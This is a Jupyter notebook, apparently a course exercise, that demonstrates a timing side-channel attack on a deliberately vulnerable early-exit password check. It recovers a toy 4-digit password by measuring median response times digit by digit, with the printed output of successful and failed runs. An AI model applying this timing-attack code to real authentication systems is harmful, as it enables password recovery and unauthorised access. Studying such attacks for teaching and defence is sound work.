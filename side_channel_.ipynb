{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMyvydqoMsuOlt3MlMmVwFB",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/sowrabh-adiga/cybersec/blob/main/side_channel_.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "oCc-UkeytcBH"
      },
      "outputs": [],
      "source": [
        "import time\n",
        "import matplotlib.pyplot as plt\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "from collections import Counter"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Assume that the site we are trying to acess does password check by comparing bit by bit with entered password and also assume that the below cell is a black box whose contents arent visible to others."
      ],
      "metadata": {
        "id": "yLR3pBO7hecu"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Black box\n",
        "\n",
        "# The vulnerable password check function, this cell is assumed to be a external site we are trying to access\n",
        "password = \"9875\"\n",
        "\n",
        "def unlock(key):\n",
        "    \"\"\"\n",
        "    Simulates a password verification process vulnerable to timing attacks.\n",
        "    \"\"\"\n",
        "    if len(key) != len(password):\n",
        "        return False\n",
        "\n",
        "    for i in range(len(key)):\n",
        "        if key[i] == password[i]:\n",
        "            continue\n",
        "        else:\n",
        "            return False\n",
        "    return True\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "# def unlock(key):\n",
        "#   if len(key) != len(password):\n",
        "#     print(\"No match ! Hint:Wrong length\")\n",
        "#     return False\n",
        "#   delay_per_char = 0.00001\n",
        "#   for i in range(len(key)):\n",
        "#     time.sleep(delay_per_char)\n",
        "#     if key[i] == password[i]:\n",
        "#       continue\n",
        "#     else:\n",
        "#       # print(f\"passwords not matching, {key}\")\n",
        "#       return False\n",
        "#   #print(\"passwords matching\")\n",
        "#   return True"
      ],
      "metadata": {
        "id": "oP8k3L2it0WH"
      },
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Function to run a single digit simulation and return the best guess\n",
        "\n",
        "First try with mean resulted im outliers swinging the results very frquently\n",
        "\n",
        "Just median also swings values but less frequent as compared to mean\n",
        "\n",
        "In the current approch I combined the median with max occurance in estimates (not mode)\n",
        "\n",
        "------------------------------\n",
        "\n",
        "\n",
        "the main idea is :`Record the max value in the list of median delays for each digits`\n",
        "\n",
        "\n",
        "------------------------------\n",
        "Approach used to make the results more reliable:\n",
        "\n",
        "First find median delay for combinations from (0-9) over many trials, then find the max number of times a number has been estimated in the 10 simulations"
      ],
      "metadata": {
        "id": "2aFp80Z_i9GK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def run_single_simulation(numTrials, passwordLen):\n",
        "    \"\"\"Runs a single timing simulation and returns the most likely first digit based on median time.\n",
        "\n",
        "    Median selected as metric to rule out any outliers due to network or execution latency\"\"\"\n",
        "    medianTimes = {}\n",
        "\n",
        "    for firstDigit in range(10):\n",
        "        testKey = str(firstDigit) + \"0\" * (passwordLen - 1)\n",
        "        trialTimes = []\n",
        "\n",
        "        # Using tqdm for a progress bar for each set of trials\n",
        "        # for _ in tqdm(range(numTrials), desc=f\"Testing '{testKey}'\"):\n",
        "        # -->> uncomment above 'for' line and comment the below 'for' line, to see each key combination being used\n",
        "        for _ in range(numTrials):\n",
        "            startTime = time.perf_counter()\n",
        "            unlock(testKey)\n",
        "            endTime = time.perf_counter()\n",
        "            trialTimes.append(endTime - startTime)\n",
        "\n",
        "        medianTimes[testKey] = np.median(trialTimes)\n",
        "\n",
        "    # Find the key with the highest median time for this run\n",
        "    estimatedKey = max(medianTimes, key=medianTimes.get)\n",
        "    return estimatedKey[0] # Return just the digit\n",
        "\n",
        "# 3. The main \"best_estimate-experiment\" loop\n",
        "numTrials = 500000\n",
        "bestEstimateRuns = 10\n",
        "allGuesses = []\n",
        "\n",
        "print(f\"Starting best-estimate-experiment: {bestEstimateRuns} runs, each with {numTrials} trials.\")\n",
        "print(\"The final result will be the most common guess across all runs.\\n\")\n",
        "\n",
        "for i in range(bestEstimateRuns):\n",
        "    print(f\"--- Running Best_Estimate-Experiment Iteration {i + 1}/{bestEstimateRuns} ---\")\n",
        "    bestGuess = run_single_simulation(numTrials, len(password))\n",
        "    allGuesses.append(bestGuess)\n",
        "    print(f\"Iteration {i + 1} best guess: {bestGuess}\\n\")\n",
        "\n",
        "# 4. Analyze the results from all the runs\n",
        "guessCounts = Counter(allGuesses)\n",
        "mostCommonGuess = guessCounts.most_common(1)[0][0]\n",
        "\n",
        "print(\"--- Final Results ---\")\n",
        "print(\"All guesses from the best--experiment:\", allGuesses)\n",
        "print(\"Frequency of guesses:\", guessCounts)\n",
        "print(f\"\\nThe most frequent guess across all {bestEstimateRuns} runs is: '{mostCommonGuess}'\")\n",
        "print(f\"The actual first digit of the password is: '{password[0]}'\")\n",
        "\n",
        "# Optional: Plotting the frequency of the guesses\n",
        "labels, values = zip(*guessCounts.items())\n",
        "indexes = np.arange(len(labels))\n",
        "width = 0.5\n",
        "\n",
        "plt.figure(figsize=(8, 5))\n",
        "plt.bar(indexes, values, width, color='purple')\n",
        "plt.xticks(indexes, labels)\n",
        "plt.xlabel('Guessed First Digit')\n",
        "plt.ylabel('Frequency (Number of Times Guessed)')\n",
        "plt.title(f'Results of Timing Attack Over {bestEstimateRuns} Runs')\n",
        "plt.grid(axis='y', linestyle='--', alpha=0.7)\n",
        "plt.show()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "LxqFcflFuM3j",
        "outputId": "0f7dec4c-407c-4748-d3d9-0400d2751d3c"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Starting best-estimate-experiment: 10 runs, each with 500000 trials.\n",
            "The final result will be the most common guess across all runs.\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 1/10 ---\n",
            "Iteration 1 best guess: 3\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 2/10 ---\n",
            "Iteration 2 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 3/10 ---\n",
            "Iteration 3 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 4/10 ---\n",
            "Iteration 4 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 5/10 ---\n",
            "Iteration 5 best guess: 0\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 6/10 ---\n",
            "Iteration 6 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 7/10 ---\n",
            "Iteration 7 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 8/10 ---\n",
            "Iteration 8 best guess: 9\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 9/10 ---\n",
            "Iteration 9 best guess: 0\n",
            "\n",
            "--- Running Best_Estimate-Experiment Iteration 10/10 ---\n",
            "Iteration 10 best guess: 9\n",
            "\n",
            "--- Final Results ---\n",
            "All guesses from the best--experiment: ['3', '9', '9', '9', '0', '9', '9', '9', '0', '9']\n",
            "Frequency of guesses: Counter({'9': 7, '0': 2, '3': 1})\n",
            "\n",
            "The most frequent guess across all 10 runs is: '9'\n",
            "The actual first digit of the password is: '9'\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x500 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Function to find the full key with same logic as above (logic used for first digit)\n",
        "\n",
        "One small change here is that the last digit in the key will have low delay as the code exits on finding the correct key. So just for last key we need to record min median value"
      ],
      "metadata": {
        "id": "9_9dApNtj_7n"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Function to run a full simulation for all digit position, following the above cell logic\n",
        "def find_next_digit(prefix, numTrials, passwordLen):\n",
        "    \"\"\"\n",
        "    Runs a simulation to find the next correct digit given a prefix.\n",
        "    Returns the most likely digit based on the meta-experiment.\n",
        "    \"\"\"\n",
        "    allGuesses = []\n",
        "    bestEstimateRuns = 10 # Number of times to repeat the experiment\n",
        "\n",
        "    print(f\"\\n--- Attacking Position {len(prefix) + 1} (prefix: '{prefix}') ---\")\n",
        "\n",
        "    for i in range(bestEstimateRuns):\n",
        "        medianTimes = {}\n",
        "        for guessDigit in range(10):\n",
        "            # Construct the key: use the found prefix, the current guess, and pad the rest with '0'\n",
        "            testKey = prefix + str(guessDigit) + \"0\" * (passwordLen - (len(prefix) + 1))\n",
        "\n",
        "            trialTimes = []\n",
        "            for _ in range(numTrials):\n",
        "                startTime = time.perf_counter_ns()\n",
        "                unlock(testKey)\n",
        "                endTime = time.perf_counter_ns()\n",
        "                trialTimes.append(endTime - startTime)\n",
        "\n",
        "            medianTimes[guessDigit] = np.median(trialTimes)\n",
        "        # Find the key with the highest median time for this single run\n",
        "        # print(medianTimes)\n",
        "        if len(prefix) < passwordLen -1:\n",
        "          estimatedKey = max(medianTimes, key=medianTimes.get)\n",
        "        else:\n",
        "          estimatedKey = min(medianTimes, key=medianTimes.get)\n",
        "        allGuesses.append(estimatedKey)\n",
        "\n",
        "    # The above logic assumes that for all position other than last one the delay will be large and the delay will be smallest for last digit\n",
        "    # Use Counter to find the most frequent guess across all meta-runs\n",
        "    guessCounts = Counter(allGuesses)\n",
        "    finalGuess = guessCounts.most_common(1)[0][0]\n",
        "    # print(allGuesses)\n",
        "    # print(guessCounts)\n",
        "    print(f\"Most likely digit is: '{finalGuess}'\")\n",
        "\n",
        "    return str(finalGuess)\n",
        "\n",
        "# Function for sending in each key element for the simulation function\n",
        "def find_full_password(passwordToCrack, numTrialsPerRun):\n",
        "    foundPassword = \"\"\n",
        "    passwordLen = len(passwordToCrack)\n",
        "\n",
        "    print(\"Beginning timing side-channel attack to find the full password...\")\n",
        "\n",
        "    for _ in range(passwordLen):\n",
        "        nextDigit = find_next_digit(foundPassword, numTrialsPerRun, passwordLen)\n",
        "        foundPassword += nextDigit\n",
        "        print(f\"Password so far: '{foundPassword}'\")\n",
        "\n",
        "    return foundPassword\n",
        "\n",
        "# Main body\n",
        "if __name__ == \"__main__\":\n",
        "    numTrialsPerRUN = 100000 # A reasonable number for demonstration for full-scale sweep\n",
        "    guessedPassword = find_full_password(password, numTrialsPerRUN)\n",
        "    if len(guessedPassword) == len(password):\n",
        "      print(\"\\n--- ATTACK SUCCESSFUL ---\")\n",
        "    else:\n",
        "      print(\"Attack failed\")\n",
        "    print(f\"The guessed password is: '{guessedPassword}'\")\n",
        "    print(f\"The actual password is: '{password}'\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Q_IgSjzgmkaO",
        "outputId": "a8e5895b-5409-4278-ca01-e64f1bf5baa4"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Beginning timing side-channel attack to find the full password...\n",
            "\n",
            "--- Attacking Position 1 (prefix: '') ---\n",
            "Most likely digit is: '9'\n",
            "Password so far: '9'\n",
            "\n",
            "--- Attacking Position 2 (prefix: '9') ---\n",
            "Most likely digit is: '8'\n",
            "Password so far: '98'\n",
            "\n",
            "--- Attacking Position 3 (prefix: '98') ---\n",
            "Most likely digit is: '7'\n",
            "Password so far: '987'\n",
            "\n",
            "--- Attacking Position 4 (prefix: '987') ---\n",
            "Most likely digit is: '5'\n",
            "Password so far: '9875'\n",
            "\n",
            "--- ATTACK SUCCESSFUL ---\n",
            "The guessed password is: '9875'\n",
            "The actual password is: '9875'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Following the instructions on the video and implementing the code for 41 tries"
      ],
      "metadata": {
        "id": "bDCN7NVChG2A"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Implementation for 41 runs\n",
        "def find_next_digit(prefix, num_trials, password_len):\n",
        "    \"\"\"\n",
        "    Runs a simulation to find the next correct digit given a prefix.\n",
        "    Returns the most likely digit based on the meta-experiment.\n",
        "    \"\"\"\n",
        "    all_guesses = []\n",
        "    NUM_META_RUNS = 1 # Number of times to repeat the experiment\n",
        "\n",
        "    print(f\"\\n--- Attacking Position {len(prefix) + 1} (prefix: '{prefix}') ---\")\n",
        "\n",
        "    for i in range(NUM_META_RUNS):\n",
        "        median_times = {}\n",
        "        for guess_digit in range(10):\n",
        "            # Construct the key: use the found prefix, the current guess, and pad the rest with '0'\n",
        "            test_key = prefix + str(guess_digit) + \"0\" * (password_len - (len(prefix) + 1))\n",
        "\n",
        "            trial_times = []\n",
        "            for _ in range(num_trials):\n",
        "                start_time = time.perf_counter_ns()\n",
        "                unlock(test_key)\n",
        "                end_time = time.perf_counter_ns()\n",
        "                trial_times.append(end_time - start_time)\n",
        "\n",
        "            median_times[guess_digit] = np.median(trial_times)\n",
        "\n",
        "        # Find the key with the highest median time for this single run\n",
        "        most_likely_digit = max(median_times, key=median_times.get)\n",
        "        all_guesses.append(most_likely_digit)\n",
        "\n",
        "    # Use Counter to find the most frequent guess across all meta-runs\n",
        "    guess_counts = Counter(all_guesses)\n",
        "    final_guess = guess_counts.most_common(1)[0][0]\n",
        "\n",
        "    print(f\"Meta-experiment results for position {len(prefix) + 1}: {guess_counts}\")\n",
        "    print(f\"Most likely digit is: '{final_guess}'\")\n",
        "\n",
        "    return str(final_guess)\n",
        "\n",
        "# 3. The main orchestration for the full attack\n",
        "def find_full_password(password_to_crack, num_trials_per_run):\n",
        "    found_password = \"\"\n",
        "    password_len = len(password_to_crack)\n",
        "\n",
        "    print(\"Beginning timing side-channel attack to find the full password...\")\n",
        "\n",
        "    for _ in range(password_len):\n",
        "        next_digit = find_next_digit(found_password, num_trials_per_run, password_len)\n",
        "        found_password += next_digit\n",
        "        print(f\"Password so far: '{found_password}'\")\n",
        "\n",
        "    return found_password\n",
        "\n",
        "# Execute the full attack\n",
        "if __name__ == \"__main__\":\n",
        "    NUM_TRIALS_PER_RUN = 41 # A reasonable number for demonstration\n",
        "    guessed_password = find_full_password(password, NUM_TRIALS_PER_RUN)\n",
        "\n",
        "    # print(\"\\n--- ATTACK SUCCESSFUL ---\")\n",
        "    print(f\"The guessed password is: '{guessed_password}'\")\n",
        "    print(f\"The actual password is: '{password}'\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CrNNaPPK8PFV",
        "outputId": "8d08b829-6705-4557-e0f9-b1c9a33f9c3f"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Beginning timing side-channel attack to find the full password...\n",
            "\n",
            "--- Attacking Position 1 (prefix: '') ---\n",
            "Meta-experiment results for position 1: Counter({0: 1})\n",
            "Most likely digit is: '0'\n",
            "Password so far: '0'\n",
            "\n",
            "--- Attacking Position 2 (prefix: '0') ---\n",
            "Meta-experiment results for position 2: Counter({6: 1})\n",
            "Most likely digit is: '6'\n",
            "Password so far: '06'\n",
            "\n",
            "--- Attacking Position 3 (prefix: '06') ---\n",
            "Meta-experiment results for position 3: Counter({0: 1})\n",
            "Most likely digit is: '0'\n",
            "Password so far: '060'\n",
            "\n",
            "--- Attacking Position 4 (prefix: '060') ---\n",
            "Meta-experiment results for position 4: Counter({6: 1})\n",
            "Most likely digit is: '6'\n",
            "Password so far: '0606'\n",
            "The guessed password is: '0606'\n",
            "The actual password is: '9875'\n"
          ]
        }
      ]
    }
  ]
}